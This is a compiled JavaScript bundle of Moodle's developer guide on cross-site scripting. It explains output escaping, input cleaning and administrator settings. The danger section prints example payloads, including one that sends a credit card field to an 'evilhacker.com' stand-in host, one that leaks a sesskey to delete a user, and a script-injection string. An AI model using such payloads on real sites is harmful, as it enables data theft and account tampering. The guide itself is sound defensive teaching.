"use strict";(self.webpackChunkdevdocs=self.webpackChunkdevdocs||[]).push([[66202],{89554:function(e,t,a){a.r(t),a.d(t,{assets:function(){return c},contentTitle:function(){return p},default:function(){return h},frontMatter:function(){return s},metadata:function(){return d},toc:function(){return u}});var n=a(87462),i=a(63366),o=(a(67294),a(3905)),r=a(13904),l=["components"],s={title:"Cross-site scripting",sidebar_position:4,tags:["Coding guidelines","Policies","Security"]},p=void 0,d={unversionedId:"development/policies/security/crosssite-scripting",id:"development/policies/security/crosssite-scripting",title:"Cross-site scripting",description:"This page forms part of the Moodle security guidelines.",source:"@site/general/development/policies/security/crosssite-scripting.md",sourceDirName:"development/policies/security",slug:"/development/policies/security/crosssite-scripting",permalink:"/devdocs/general/development/policies/security/crosssite-scripting",editUrl:"https://github.com/moodle/devdocs/edit/main/general/development/policies/security/crosssite-scripting.md",tags:[{label:"Coding guidelines",permalink:"/devdocs/general/tags/coding-guidelines"},{label:"Policies",permalink:"/devdocs/general/tags/policies"},{label:"Security",permalink:"/devdocs/general/tags/security"}],version:"current",lastUpdatedBy:"Sara Arjona",lastUpdatedAt:1653897451,formattedLastUpdatedAt:"30/05/2022",sidebarPosition:4,frontMatter:{title:"Cross-site scripting",sidebar_position:4,tags:["Coding guidelines","Policies","Security"]},sidebar:"coding",previous:{title:"Cross-site request forgery",permalink:"/devdocs/general/development/policies/security/crosssite-request-forgery"},next:{title:"SQL injection",permalink:"/devdocs/general/development/policies/security/sql-injection"}},c={},u=[{value:"What is the danger?",id:"what-is-the-danger",level:2},{value:"How Moodle avoids this problem",id:"how-moodle-avoids-this-problem",level:2},{value:"Escaping output",id:"escaping-output",level:3},{value:"Escaping output 2 - JavaScript",id:"escaping-output-2---javascript",level:3},{value:"Cleaning input",id:"cleaning-input",level:3},{value:"What you need to do in your code",id:"what-you-need-to-do-in-your-code",level:2},{value:"What you need to do as an administrator",id:"what-you-need-to-do-as-an-administrator",level:2},{value:"See also",id:"see-also",level:2}],m={toc:u};function h(e){var t=e.components,a=(0,i.Z)(e,l);return(0,o.kt)("wrapper",(0,n.Z)({},m,a,{components:t,mdxType:"MDXLayout"}),(0,o.kt)(r.Z,(0,n.Z)({frontMatter:s},void 0!==d?{metadata:d}:{},{mdxType:"MoodlePageBanner"})),(0,o.kt)("div",{className:"admonition admonition-note alert alert--secondary"},(0,o.kt)("div",{parentName:"div",className:"admonition-heading"},(0,o.kt)("h5",{parentName:"div"},(0,o.kt)("span",{parentName:"h5",className:"admonition-icon"},(0,o.kt)("svg",{parentName:"span",xmlns:"http://www.w3.org/2000/svg",width:"14",height:"16",viewBox:"0 0 14 16"},(0,o.kt)("path",{parentName:"svg",fillRule:"evenodd",d:"M6.3 5.69a.942.942 0 0 1-.28-.7c0-.28.09-.52.28-.7.19-.18.42-.28.7-.28.28 0 .52.09.7.28.18.19.28.42.28.7 0 .28-.09.52-.28.7a1 1 0 0 1-.7.3c-.28 0-.52-.11-.7-.3zM8 7.99c-.02-.25-.11-.48-.31-.69-.2-.19-.42-.3-.69-.31H6c-.27.02-.48.13-.69.31-.2.2-.3.44-.31.69h1v3c.02.27.11.5.31.69.2.2.42.31.69.31h1c.27 0 .48-.11.69-.31.2-.19.3-.42.31-.69H8V7.98v.01zM7 2.3c-3.14 0-5.7 2.54-5.7 5.68 0 3.14 2.56 5.7 5.7 5.7s5.7-2.55 5.7-5.7c0-3.15-2.56-5.69-5.7-5.69v.01zM7 .98c3.86 0 7 3.14 7 7s-3.14 7-7 7-7-3.12-7-7 3.14-7 7-7z"}))),"note")),(0,o.kt)("div",{parentName:"div",className:"admonition-content"},(0,o.kt)("p",{parentName:"div"},"This page forms part of the ",(0,o.kt)("a",{parentName:"p",href:"../security"},"Moodle security guidelines"),"."))),(0,o.kt)("h2",{id:"what-is-the-danger"},"What is the danger?"),(0,o.kt)("p",null,"Normally, web browsers prevent JavaScript from the server from affecting content that comes from another server. For example, suppose that on your Moodle page (",(0,o.kt)("inlineCode",{parentName:"p"},"http://mymooodle.com"),"), you have an iframe displaying an advert from ",(0,o.kt)("inlineCode",{parentName:"p"},"http://makemerich.com"),". Then, the JavaScript code in the advert cannot access anything on your page."),(0,o.kt)("p",null,"In Moodle, we actually let users type in HTML, then we display that HTML as part of our web site. Therefore, any JavaScript they manage to include will have full access to everything on the page."),(0,o.kt)("p",null,"Why is that a problem? Well, suppose Evil Hacker manages to get some code like"),(0,o.kt)("pre",null,(0,o.kt)("code",{parentName:"pre",className:"language-javascript"},"document.write('<img width=\"1\" height=\"1\" ' +\n     'src=\"http://evilhacker.com/savedata.php?creditcard=' +\n     document.getElementById('creditcard').value + '\" />');\n")),(0,o.kt)("p",null,"on a page where the user types in their credit card number. Actually, that scenario is quite unlikely in Moodle, but there are more plausible scenarios that are possible."),(0,o.kt)("p",null,"Another problem is that XSS makes it much easier for Evil Hacker get round sesskey protection. For example:"),(0,o.kt)("pre",null,(0,o.kt)("code",{parentName:"pre",className:"language-javascript"},"document.write('<img width=\"1\" height=\"1\" ' +\n     'src=\"http://example.com/moodle/user/delete.php?id=123&confirm=1&sesskey=' +\n     document.getElementById('sesskey').value + '\" />');\n")),(0,o.kt)("p",null,"Or even more sophisticated, the JavaScript to do that as a POST request, in a forum where an Administrator would go, would be very bad."),(0,o.kt)("p",null,"Note that, at least in Internet Explorer, JavaScript can be hidden in CSS style information, as well as in the HTML. Java applets can also be used to execute scripting, as well as the browser's JavaScript engine."),(0,o.kt)("p",null,"Note also that dangerous content may not only be input into Moodle directly by a user. It may also come, for example, from an external RSS feed."),(0,o.kt)("h2",{id:"how-moodle-avoids-this-problem"},"How Moodle avoids this problem"),(0,o.kt)("p",null,"The simplest solution to XSS attacks is to ",(0,o.kt)("strong",{parentName:"p"},"never let the user input rich content")," like HTML or upload plugins like Java applets. Unfortunately, with Moodle we want to let our users communicate using rich content. For example, we want students to be able to express themselves by making forum posts in flashing orange text. We want teacher to be able to upload interesting applets for use by their students. Therefore, we have to compromise."),(0,o.kt)("h3",{id:"escaping-output"},"Escaping output"),(0,o.kt)("p",null,"Moodle divides content that has been input by the user into four categories:"),(0,o.kt)("ol",null,(0,o.kt)("li",{parentName:"ol"},(0,o.kt)("strong",{parentName:"li"},"Plain text content"),". For example, a student's response to a short answer question."),(0,o.kt)("li",{parentName:"ol"},(0,o.kt)("strong",{parentName:"li"},"Labels that are plain text"),", except that they main contain multi-lang spans. For example, a course name or section heading."),(0,o.kt)("li",{parentName:"ol"},(0,o.kt)("strong",{parentName:"li"},"HTML (or wiki, markdown) content"),", that might have been input by anyone. For example, the body of a forum post."),(0,o.kt)("li",{parentName:"ol"},(0,o.kt)("strong",{parentName:"li"},"HTML (or wiki, markdown) content"),", that could only have been input by a ",(0,o.kt)("strong",{parentName:"li"},"trusted user"),", like a teacher. For example, the body of a web page resource.")),(0,o.kt)("p",null,"Depending on the type of content, you need to use the appropriate function to output it. For example, if you have plain text content, you should use the ",(0,o.kt)("inlineCode",{parentName:"p"},"s()")," function to output it. That will replace any ",(0,o.kt)("inlineCode",{parentName:"p"},"<")," character with ",(0,o.kt)("inlineCode",{parentName:"p"},"&lt;"),". If that is done, there is no way that the input can be interpreted as JavaScript."),(0,o.kt)("h3",{id:"escaping-output-2---javascript"},"Escaping output 2 - JavaScript"),(0,o.kt)("p",null,"The other place you need to be careful is when you are sending data to JavaScript. For example, if you generate JavaScript in your PHP code like"),(0,o.kt)("pre",null,(0,o.kt)("code",{parentName:"pre",className:"language-php"},"echo '<script type=\"text/javascript\">';\necho 'alert(\"' . $userinput . '\");';\necho '<\/script>';\n")),(0,o.kt)("p",null,"and Evil hacker can make ",(0,o.kt)("inlineCode",{parentName:"p"},"$userinput")," equal to something like:"),(0,o.kt)("pre",null,(0,o.kt)("code",{parentName:"pre",className:"language-php"},"); /* Do something evil. */ (\n")),(0,o.kt)("p",null,"then they can get whatever code they choose to put in the ",(0,o.kt)("inlineCode",{parentName:"p"},"/* Do something evil. */")," space to run within your web page."),(0,o.kt)("p",null,"The best solution is to not echo JavaScript like this. Instead, follow the ",(0,o.kt)("a",{parentName:"p",href:"/docs/guides/javascript"},"JavaScript guidelines"),", and put your JavaScript in an external file, and communicate with it using ",(0,o.kt)("inlineCode",{parentName:"p"},"$PAGE->requires->data_for_js")," or ",(0,o.kt)("inlineCode",{parentName:"p"},"$PAGE->requires->js_function_call"),". Those two methods properly encode any PHP data to be passed to JavaScript using ",(0,o.kt)("inlineCode",{parentName:"p"},"json_encode"),"."),(0,o.kt)("h3",{id:"cleaning-input"},"Cleaning input"),(0,o.kt)("p",null,"The other part of the protection is cleaning up data as it comes in. This is done using the ",(0,o.kt)("inlineCode",{parentName:"p"},"optional_param")," or ",(0,o.kt)("inlineCode",{parentName:"p"},"required_param")," functions. For example, if you say you are expecting an integer as input, by passing ",(0,o.kt)("inlineCode",{parentName:"p"},"PARAM_INT"),", then you will only get an integer back. Once you know that a variable only contains an integer value, you can be sure it does not contain any malicious JavaScript."),(0,o.kt)("p",null,"However, for very complex input, like HTML, doing the cleaning is very tricky, and the code is likely to handle some complex situations badly. The algorithms will almost certainly be improved in the future, so for complex content, we store the raw input in the database, and only do the cleaning when it is output, using the latest algorithms."),(0,o.kt)("h2",{id:"what-you-need-to-do-in-your-code"},"What you need to do in your code"),(0,o.kt)("ul",null,(0,o.kt)("li",{parentName:"ul"},"Get input values using ",(0,o.kt)("inlineCode",{parentName:"li"},"optional_param")," or ",(0,o.kt)("inlineCode",{parentName:"li"},"required_param")," with an appropriate ",(0,o.kt)("inlineCode",{parentName:"li"},"PARAM_*")," type, to ensure that only data of the type you expect is accepted."),(0,o.kt)("li",{parentName:"ul"},"Alternatively, use a ",(0,o.kt)("a",{parentName:"li",href:"https://docs.moodle.org/dev/lib/formslib.php"},"moodleforms"),", with appropriate ",(0,o.kt)("inlineCode",{parentName:"li"},"->setType")," calls in the form definition."),(0,o.kt)("li",{parentName:"ul"},"Clean or escape content appropriately on output.",(0,o.kt)("ul",{parentName:"li"},(0,o.kt)("li",{parentName:"ul"},"Use ",(0,o.kt)("inlineCode",{parentName:"li"},"s()")," or ",(0,o.kt)("inlineCode",{parentName:"li"},"p()")," to output plain text content (type 1 above)."),(0,o.kt)("li",{parentName:"ul"},"Use ",(0,o.kt)("inlineCode",{parentName:"li"},"format_string")," to output content with minimal HTML like multi-lang spans (type 2 above)."),(0,o.kt)("li",{parentName:"ul"},"Use ",(0,o.kt)("inlineCode",{parentName:"li"},"format_text")," to output all other content (types 3 and 4 above). How carefully it is cleaned (that is, the difference between type 3 and 4) depends on the ",(0,o.kt)("inlineCode",{parentName:"li"},"$options->noclean")," argument to ",(0,o.kt)("inlineCode",{parentName:"li"},"format_text"),"."))),(0,o.kt)("li",{parentName:"ul"},"Any place where a use can input content that is output by ",(0,o.kt)("inlineCode",{parentName:"li"},"format_text"),", ",(0,o.kt)("inlineCode",{parentName:"li"},"$options->noclean"),", must be protected by a capability check, and the capability must be marked as ",(0,o.kt)("inlineCode",{parentName:"li"},"RISK_XSS"),"."),(0,o.kt)("li",{parentName:"ul"},"When sending data to JavaScript code:",(0,o.kt)("ul",{parentName:"li"},(0,o.kt)("li",{parentName:"ul"},"Use the ",(0,o.kt)("inlineCode",{parentName:"li"},"$PAGE->requires->data_for_js")," or ",(0,o.kt)("inlineCode",{parentName:"li"},"$PAGE->requires->js_function_call")," methods."),(0,o.kt)("li",{parentName:"ul"},"In Moodle 1.9 and earlier, escape the data with ",(0,o.kt)("inlineCode",{parentName:"li"},"addslashes_js")," before printing it into the JavaScript code.")))),(0,o.kt)("div",{className:"admonition admonition-info alert alert--info"},(0,o.kt)("div",{parentName:"div",className:"admonition-heading"},(0,o.kt)("h5",{parentName:"div"},(0,o.kt)("span",{parentName:"h5",className:"admonition-icon"},(0,o.kt)("svg",{parentName:"span",xmlns:"http://www.w3.org/2000/svg",width:"14",height:"16",viewBox:"0 0 14 16"},(0,o.kt)("path",{parentName:"svg",fillRule:"evenodd",d:"M7 2.3c3.14 0 5.7 2.56 5.7 5.7s-2.56 5.7-5.7 5.7A5.71 5.71 0 0 1 1.3 8c0-3.14 2.56-5.7 5.7-5.7zM7 1C3.14 1 0 4.14 0 8s3.14 7 7 7 7-3.14 7-7-3.14-7-7-7zm1 3H6v5h2V4zm0 6H6v2h2v-2z"}))),"info")),(0,o.kt)("div",{parentName:"div",className:"admonition-content"},(0,o.kt)("p",{parentName:"div"},"Follow the ",(0,o.kt)("a",{parentName:"p",href:"https://docs.moodle.org/dev/Output_functions"},"Output functions")," link to get a best understanding of how dynamic data should be sent from Moodle to the browser."))),(0,o.kt)("h2",{id:"what-you-need-to-do-as-an-administrator"},"What you need to do as an administrator"),(0,o.kt)("ul",null,(0,o.kt)("li",{parentName:"ul"},"Do not allow a user to have a capability with ",(0,o.kt)("inlineCode",{parentName:"li"},"RISK_XSS")," unless you trust them.",(0,o.kt)("ul",{parentName:"li"},(0,o.kt)("li",{parentName:"ul"},"The ",(0,o.kt)("a",{parentName:"li",href:"https://docs.moodle.org//en/Security_overview"},"Security overview")," report can help you check this."))),(0,o.kt)("li",{parentName:"ul"},"From Moodle 3.5 onwards, you can enable setting ",(0,o.kt)("strong",{parentName:"li"},"Content cleaning everywhere"),"(",(0,o.kt)("inlineCode",{parentName:"li"},"$CFG->forceclean"),").")),(0,o.kt)("h2",{id:"see-also"},"See also"),(0,o.kt)("ul",null,(0,o.kt)("li",{parentName:"ul"},(0,o.kt)("a",{parentName:"li",href:"../security"},"Security")),(0,o.kt)("li",{parentName:"ul"},(0,o.kt)("a",{parentName:"li",href:"https://docs.moodle.org/dev/Coding"},"Coding"))))}h.isMDXComponent=!0}}]);